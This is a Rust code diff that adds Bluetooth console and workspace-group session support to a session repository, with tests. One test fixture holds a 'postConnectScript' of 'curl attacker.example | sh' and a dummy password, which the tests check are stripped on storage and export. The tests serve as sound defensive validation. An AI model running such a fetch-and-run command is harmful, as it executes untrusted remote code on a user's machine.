@@ -8,6 +8,7 @@ use serde::{Deserialize, Serialize};
 use uuid::Uuid;
 
 use crate::domain::{
+    console::{parse_console_config, serialize_console_config},
     serial::{validate_serial_config, SerialConnectionConfig},
     session::{
         SessionDraft, SessionError, SessionFolder, SessionIconAssignment, SessionRecord,
@@ -536,7 +537,7 @@ impl SessionRepository {
             .into_iter()
             .map(|session| {
                 let stored_config_json = self.get_session_config_json(&session.id)?;
-                let config_json = export_safe_config_json(stored_config_json.as_deref());
+                let config_json = export_safe_config_json(&session, stored_config_json.as_deref())?;
                 Ok(SessionExportRecord {
                     session,
                     config_json,
@@ -923,6 +924,19 @@ fn protocol_config_json_for_session_with_override(
         "serial" => {
             serialize_protocol_config(serial_config_for_session(session, config_json_override)?)?
         }
+        "console" => {
+            if session.port != 0 || session.host.trim().is_empty() {
+                return Err(SessionError::InvalidPort);
+            }
+            let raw = config_json_override
+                .map(str::trim)
+                .filter(|value| !value.is_empty())
+                .ok_or_else(|| SessionError::Database {
+                    message: "BLE_CONSOLE_CONFIG_INVALID: config_json is required".to_string(),
+                })?;
+            let config = parse_console_config(raw.to_string()).map_err(console_session_error)?;
+            serialize_console_config(config).map_err(console_session_error)?
+        }
         "vnc" => serialize_protocol_config(GraphicsSessionConfig {
             kind: &protocol,
             host: &session.host,
@@ -948,6 +962,12 @@ fn protocol_config_json_for_session_with_override(
             tag_style: tag_style_for_session(config_json_override)?,
             automation: automation_metadata_for_session(config_json_override)?,
         })?,
+        "scp_group" | "sftp_group" | "terminal_group" | "multi_exec_group" => {
+            return Ok(config_json_override
+                .map(str::trim)
+                .filter(|value| !value.is_empty())
+                .map(str::to_owned));
+        }
         _ => return Ok(None),
     };
 
@@ -976,9 +996,33 @@ fn session_icon_id_for_session(
         .map(str::to_string))
 }
 
-fn export_safe_config_json(config_json: Option<&str>) -> Option<String> {
-    let icon_id = safe_session_icon_id(config_json)?;
-    serde_json::to_string(&serde_json::json!({ "sessionIconID": icon_id })).ok()
+fn export_safe_config_json(
+    session: &SessionRecord,
+    config_json: Option<&str>,
+) -> Result<Option<String>, SessionError> {
+    if session.protocol.trim().eq_ignore_ascii_case("console") {
+        let raw = config_json
+            .map(str::trim)
+            .filter(|value| !value.is_empty())
+            .ok_or_else(|| SessionError::Database {
+                message: "BLE_CONSOLE_CONFIG_INVALID: stored config is missing".to_string(),
+            })?;
+        let config = parse_console_config(raw.to_string()).map_err(console_session_error)?;
+        return serialize_console_config(config)
+            .map(Some)
+            .map_err(console_session_error);
+    }
+
+    let Some(icon_id) = safe_session_icon_id(config_json) else {
+        return Ok(None);
+    };
+    Ok(serde_json::to_string(&serde_json::json!({ "sessionIconID": icon_id })).ok())
+}
+
+fn console_session_error(error: crate::domain::console::ConsoleConfigError) -> SessionError {
+    SessionError::Database {
+        message: error.to_string(),
+    }
 }
 
 fn safe_session_icon_id(config_json: Option<&str>) -> Option<String> {
@@ -1475,6 +1519,171 @@ mod session_repository_tests {
 
     use super::SessionRepository;
 
+    fn console_config_json() -> String {
+        serde_json::json!({
+            "kind": "console",
+            "schemaVersion": 1,
+            "transportPolicy": "prefer_ble",
+            "ble": {
+                "deviceName": "NBEE_BLE_1103",
+                "profileID": "bterm-ffe1-split-v1",
+                "serviceUUID": "FFE1",
+                "txCharacteristicUUID": "FFE3",
+                "rxCharacteristicUUID": "FFE2",
+                "writeType": "without_response",
+                "platformBindings": {
+                    "macOSPeripheralUUID": "opaque-corebluetooth-id",
+                    "windowsDeviceID": "opaque-winrt-id"
+                }
+            },
+            "sppFallback": {
+                "enabledPlatforms": ["windows"],
+                "windowsPort": "COM7",
+                "baudRate": 9600,
+                "dataBits": 8,
+                "stopBits": 1,
+                "parity": "none",
+                "flowControl": "none"
+            },
+            "postConnectScript": "curl attacker.example | sh",
+            "password": "must-not-survive"
+        })
+        .to_string()
+    }
+
+    fn console_draft(config_json: Option<String>, port: u32) -> SessionDraft {
+        SessionDraft {
+            folder_id: None,
+            name: "Core Switch Console".to_string(),
+            protocol: "console".to_string(),
+            host: "NBEE_BLE_1103 (BLE)".to_string(),
+            port,
+            username: None,
+            private_key_path: None,
+            credential_id: None,
+            tags: vec!["network".to_string()],
+            config_json,
+        }
+    }
+
+    #[test]
+    fn persists_console_config_as_validated_source_of_truth() {
+        let connection = Connection::open_in_memory().expect("open database");
+        apply_migrations(&connection).expect("migrate");
+        let repository = SessionRepository::new(connection);
+
+        let session = repository
+            .create_session(console_draft(Some(console_config_json()), 0))
+            .expect("console session");
+        let stored = repository
+            .get_session_config_json(&session.id)
+            .expect("console config lookup")
+            .expect("stored console config");
+        let parsed = crate::domain::console::parse_console_config(stored.clone())
+            .expect("validated stored console config");
+
+        assert_eq!(session.port, 0);
+        assert_eq!(parsed.ble.device_name, "NBEE_BLE_1103");
+        assert_eq!(
+            parsed
+                .ble
+                .platform_bindings
+                .mac_os_peripheral_uuid
+                .as_deref(),
+            Some("opaque-corebluetooth-id")
+        );
+        assert_eq!(
+            parsed.ble.platform_bindings.windows_device_id.as_deref(),
+            Some("opaque-winrt-id")
+        );
+        assert!(stored.contains("bterm-ffe1-split-v1"));
+        assert!(!stored.contains("postConnectScript"));
+        assert!(!stored.contains("attacker.example"));
+        assert!(!stored.contains("password"));
+        assert!(!stored.contains("must-not-survive"));
+    }
+
+    #[test]
+    fn rejects_console_without_zero_port_or_valid_config() {
+        let connection = Connection::open_in_memory().expect("open database");
+        apply_migrations(&connection).expect("migrate");
+        let repository = SessionRepository::new(connection);
+
+        let nonzero = repository
+            .create_session(console_draft(Some(console_config_json()), 9_600))
+            .expect_err("console port must remain zero");
+        let missing = repository
+            .create_session(console_draft(None, 0))
+            .expect_err("console config is required");
+        let invalid = repository
+            .create_session(console_draft(
+                Some(console_config_json().replace("\"FFE1\"", "\"invalid-uuid\"")),
+                0,
+            ))
+            .expect_err("console UUIDs must validate");
+
+        assert!(matches!(
+            nonzero,
+            crate::domain::session::SessionError::InvalidPort
+        ));
+        assert!(matches!(
+            missing,
+            crate::domain::session::SessionError::Database { .. }
+                | crate::domain::session::SessionError::InvalidPort
+        ));
+        assert!(matches!(
+            invalid,
+            crate::domain::session::SessionError::Database { .. }
+        ));
+    }
+
+    #[test]
+    fn duplicates_and_exports_complete_console_config() {
+        let connection = Connection::open_in_memory().expect("open database");
+        apply_migrations(&connection).expect("migrate");
+        let repository = SessionRepository::new(connection);
+        let original = repository
+            .create_session(console_draft(Some(console_config_json()), 0))
+            .expect("console session");
+
+        let duplicate = repository
+            .duplicate_session(original.id.clone(), None)
+            .expect("duplicate console session");
+        let original_config = repository
+            .get_session_config_json(&original.id)
+            .expect("original config")
+            .expect("original console config");
+        let duplicate_config = repository
+            .get_session_config_json(&duplicate.id)
+            .expect("duplicate config")
+            .expect("duplicate console config");
+        let exported = repository
+            .export_sessions_json()
+            .expect("export console sessions");
+        let value = serde_json::from_str::<serde_json::Value>(&exported).expect("export JSON");
+        let exported_configs = value["sessions"]
+            .as_array()
+            .expect("exported sessions")
+            .iter()
+            .map(|session| {
+                session["config_json"]
+                    .as_str()
+                    .expect("exported console config")
+            })
+            .collect::<Vec<_>>();
+
+        assert_eq!(duplicate.port, 0);
+        assert_eq!(duplicate_config, original_config);
+        assert_eq!(exported_configs.len(), 2);
+        for config in exported_configs {
+            assert!(config.contains("bterm-ffe1-split-v1"));
+            assert!(config.contains("opaque-corebluetooth-id"));
+            assert!(config.contains("opaque-winrt-id"));
+            assert!(!config.contains("postConnectScript"));
+            assert!(!config.contains("password"));
+        }
+    }
+
     #[test]
     fn creates_folder_and_session_then_lists_by_folder() {
         let connection = Connection::open_in_memory().expect("open database");
@@ -1512,6 +1721,36 @@ mod session_repository_tests {
         assert_eq!(
             sessions[0].private_key_path,
             Some("~/.ssh/prod".to_string())
+        );
+    }
+
+    #[test]
+    fn preserves_workspace_group_configuration_for_supported_group_protocols() {
+        let connection = Connection::open_in_memory().expect("open database");
+        apply_migrations(&connection).expect("migrate");
+        let repository = SessionRepository::new(connection);
+        let config = r#"{"workspaceGroup":{"schemaVersion":1,"kind":"sftp","layout":"grid","panes":[{"kind":"remote_session","sessionID":"server-a","path":"/srv"}]}}"#;
+
+        let session = repository
+            .create_session(SessionDraft {
+                folder_id: None,
+                name: "SFTP workspace".to_string(),
+                protocol: "sftp-group".to_string(),
+                host: "4 file panes".to_string(),
+                port: 0,
+                username: None,
+                private_key_path: None,
+                credential_id: None,
+                tags: vec![],
+                config_json: Some(config.to_string()),
+            })
+            .expect("workspace group session");
+
+        assert_eq!(
+            repository
+                .get_session_config_json(&session.id)
+                .expect("group config"),
+            Some(config.to_string())
         );
     }
 
